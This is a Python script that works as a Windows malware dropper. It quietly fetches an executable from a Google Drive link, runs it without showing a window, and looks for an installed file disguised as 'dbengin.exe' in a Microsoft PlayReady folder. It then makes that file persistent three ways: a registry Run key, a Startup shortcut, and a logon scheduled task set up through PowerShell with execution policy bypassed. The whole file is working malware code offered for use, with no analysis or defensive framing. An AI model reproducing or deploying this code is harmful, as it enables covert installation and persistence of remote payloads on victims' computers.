import subprocess
import sys
import os
import time
import winreg
from pathlib import Path
import shutil

GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
OUTPUT_NAME = "downloaded_file.exe"
LOG_FILE = Path(os.environ.get("TEMP", "")) / "persist_log.txt"

def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
    except:
        pass

def run_hidden(cmd, wait=False):
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    if wait:
        return subprocess.run(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        return subprocess.Popen(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

def set_autorun_registry(exe_path: Path):
    """Set HKCU Run entry and verify."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE) as key:
            winreg.SetValueEx(key, "UserAppStartup", 0, winreg.REG_SZ, str(exe_path))
            # Verify
            value, _ = winreg.QueryValueEx(key, "UserAppStartup")
            if value == str(exe_path):
                log("Registry entry set successfully.")
            else:
                log(f"Registry verification failed: expected {exe_path}, got {value}")
    except Exception as e:
        log(f"Registry error: {e}")

def add_to_startup_folder(exe_path: Path):
    """Copy a shortcut to the user's Startup folder."""
    try:
        startup = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup.mkdir(parents=True, exist_ok=True)
        shortcut_path = startup / "UserAppStartup.lnk"
        # Create shortcut using PowerShell (more reliable)
        ps_script = f'''
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
        $Shortcut.TargetPath = "{exe_path}"
        $Shortcut.Save()
        '''
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        log(f"Startup shortcut created at {shortcut_path}")
    except Exception as e:
        log(f"Startup folder error: {e}")

def create_logon_scheduled_task(exe_path: Path):
    """Create a scheduled task that runs at user logon (not just daily)."""
    task_name = "UserAppStartup"
    ps_script = f'''
    $taskName = "{task_name}"
    $action = New-ScheduledTaskAction -Execute "{exe_path}"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
    '''
    try:
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                       capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        log("Scheduled task (logon) created successfully.")
    except subprocess.CalledProcessError as e:
        log(f"Scheduled task error: {e.stderr.decode() if e.stderr else 'unknown'}")

def ensure_persistence():
    """Locate final exe and apply all persistence methods."""
    final_path = None
    # Known possible locations
    candidates = [
        Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe",
        Path(os.environ.get("APPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe",
        Path(OUTPUT_NAME).absolute()  # fallback to original download location
    ]
    for _ in range(20):  # wait up to 20 seconds
        for p in candidates:
            if p.exists():
                final_path = p
                break
        if final_path:
            break
        time.sleep(1)

    if not final_path:
        log("Final executable not found after waiting.")
        return

    log(f"Found final exe at {final_path}")
    set_autorun_registry(final_path)
    add_to_startup_folder(final_path)
    create_logon_scheduled_task(final_path)

def main():
    if sys.platform != "win32":
        return

    log("=== Persistence script started ===")
    url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
    cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]

    # Download
    try:
        run_hidden(cmd, wait=True)
        log("Download completed.")
    except Exception as e:
        log(f"Download failed: {e}")
        return

    # Run the downloaded exe (allow it to self-install)
    exe_path = Path(OUTPUT_NAME)
    if not exe_path.exists():
        log("Downloaded file missing after download.")
        return
    try:
        run_hidden([str(exe_path)], wait=True)
        log("Executed downloaded file (waited for it to finish).")
    except Exception as e:
        log(f"Execution error: {e}")

    # Set up persistence
    ensure_persistence()
    log("=== Persistence script finished ===")

if __name__ == "__main__":
    main()